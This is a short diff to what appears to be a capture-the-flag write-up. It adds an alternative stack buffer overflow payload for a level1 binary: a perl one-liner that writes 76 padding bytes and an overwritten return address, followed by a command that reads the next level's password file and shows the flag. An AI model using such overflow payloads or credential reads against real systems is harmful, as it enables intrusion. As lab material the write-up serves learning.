@@ -40,3 +40,12 @@ Good... Wait what?
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
 
+---
+alternative
+```bash
+> (perl -e 'print "a"x76 . "\x44\x84\x04\x08"'; cat) | ./level1
+
+Good... Wait what?
+cat /home/user/level2/.pass
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
